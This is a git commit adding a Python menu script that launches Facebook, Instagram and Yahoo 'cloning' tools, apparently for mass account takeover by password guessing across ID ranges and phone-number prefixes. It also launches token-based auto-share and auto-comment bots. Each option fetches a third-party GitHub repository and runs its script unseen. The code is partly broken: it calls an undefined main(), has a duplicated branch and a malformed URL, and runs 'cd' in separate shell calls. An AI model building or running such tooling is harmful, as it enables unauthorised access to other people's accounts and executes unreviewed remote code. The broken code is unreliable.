8c67bb570534bf5b169f22639638707aa9b08339
sanjida9999 <101853629+sanjida9999@users.noreply.github.com>
2022-06-17 22:46:30 +0600

    Add files via upload

---
+++ mahdi.py
@@ -0,0 +1,244 @@
+import os
+
+import sys
+
+import time
+os.system('clear')
+os.system("pip install requests")
+
+def menu():
+    os.system('clear')
+
+print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
+\033[0m================================================================
+\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
+\033[0;33mGITHUB : \033[1;97mhttps://github.com/====
+\033[1;31mFb ; https://web.facebook.com/m.mahdi.80
+WHATAPP:01887408882
+\033[1;33mLIVE in Sylhet (Read in class 10)
+\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU 
+\033[0;36m================================================================""")
+print("""
+\033[1;36m[1]CLONE FROM2006- 2009 ID
+\033[1;32m[2]CLONE FROM 2009 ID 
+\033[1;88m[3]CLONE FROM 2010-2020 ID
+\033[1;33m[4]CLONE FROM  BANGLADESH 6DIG[All SIM]
+\033[1;32m[5]CLONE FROM INSTRAGAM ID
+\033[1;33m[6]CLONE FROM FRIENDLIST (NEED TOKEN)
+\033[1;36m[7]CLONE FROM  PUBLICK ID v2
+\033[1;32m[8]CLONE FROM ID BANGLADESH 11DIG[All SIM]
+\033[1;33m[9]CLONE FROM NUMBER BD
+\033[1;88m[10]CLONE FROM FREOM PAKISTAN 
+\033[1;88m[11]CLONE FROM FROM INDIA
+\033[0;33m[12]CLONE FROM AFGHANISTAN 
+\033[0;88m[13]CLONE FROM FREOM PAKISTAN V2(All SIM)
+\033[1;33m[14]CLONE FROM FREOM File Creating
+\033[1;35m[15]CLONE FROM LATEST FB CRACKING LOGIN
+\033[1;33m[16]CLONE FROM ID BANGLADESH 9DIG (All SIM)
+\033[1;32m[17]CLONE FROM 2009 ID [MAO]
+\033[1;37m[18]FB AUTO SHARE (need TOKEN)
+\033[1;33m[19]FB AUTO COMMENT(need TOKEN)
+\033[1;33m[20]CLONE YAHOO 
+\033[1;36m[21]CLONE FROM  PUBLICK ID  (Best) v2
+\033[1;36m[22]CLONE FROM  PUBLICK ID  (best) v2
+\033[1;33m[23]CLONE FROM FREOM File Creating V
+\033[1;36m[24]CLONE FROM2003- 2005 ID[VARY SLOW]
+\033[1;36m[25]CLONE FROM ID BANGLADESH 11DIG[BEST]
+""")
+pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")
+
+if pil in ["01", "1"]:
+
+    os.system('cd paidfree4')
+    os.system('python2 mahdi9.py')
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+
+elif pil in ["02", "2"]:
+    os.system('cd paidfree4')
+    os.system('python 20091st.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+
+
+
+elif pil in ["03", "3"]:
+    os.system('cd paidfree4')
+    os.system('python2 pakistan.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+elif pil in ["04", "4"]:
+    os.system('cd paidfree4')
+    os.system('python2 BD6.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+
+
+
+elif pil in ["05", "5"]:
+    os.system('cd paidfree4 && python instragam.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+elif pil in ["06", "6"]:
+    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
+    os.system('python Nx.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+
+elif pil in ["07", "7"]:
+    os.system('cd paidfree4')
+    os.system('python Prem.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+elif pil in ["08", "8"]:
+    os.system('cd paidfree4')
+    os.system('python2 BD11.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+elif pil in ["09", "9"]:
+    os.system('git clone https://github.com/Azim-vau/smbf.git && cd smbf')
+    os.system('python2 smbf.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+elif pil in ["10"]:
+    os.system('cd paidfree4 && python2 pakistan.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+	
+	
+elif pil in ["11"]:
+    os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)	
+elif pil in ["12"]:
+
+    os.system('python2 Mahadi-Afg.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+elif pil in ["13"]:
+    os.system('cd paidfree4')
+    os.system('python mahdi2.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+
+elif pil in ["14"]:
+    os.system('git clone https:/github.com/James404-cyber/DUM-ID.git')
+    os.system('cd DUM-ID && python Doubled.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    main()
+
+elif pil in ["15"]:
+    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
+    system('python Nx.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+    
+elif pil in ["16"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd shuvook && python2 bd9.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+elif pil in ["17"]:
+    os.system('pip2 install mclone')
+    os.system('mclone')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+elif pil in ["18"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
+    os.system('cd fbboT && python mahdi.py')
+elif pil in ["19"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
+    os.system('cd fbboT && python autocomment.py')
+	
+elif pil in ["20"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/texs')	
+    os.system('cd texs && python yahoo.py')
+elif pil in ["20"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python ')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)	
+
+elif pil in ["21"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/mall')
+    os.system('cd mall && python Adf.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+	
+elif pil in ["22"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/mall')
+    os.system('cd mall && python fcpromax.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)	
+elif pil in ["23"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/mall')
+    os.system('cd mall && python2 file.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+elif pil in ["24"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/texs')
+    os.system('cd texs && python2 811.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
+
+elif pil in ["25"]:
+    os.system('git clone https://github.com/Shuvo-BBHH/mall')
+    os.system('cd mall && python2 RR_Premium.py')
+    time.sleep(2)
+    print(" ")
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+    time.sleep(2)
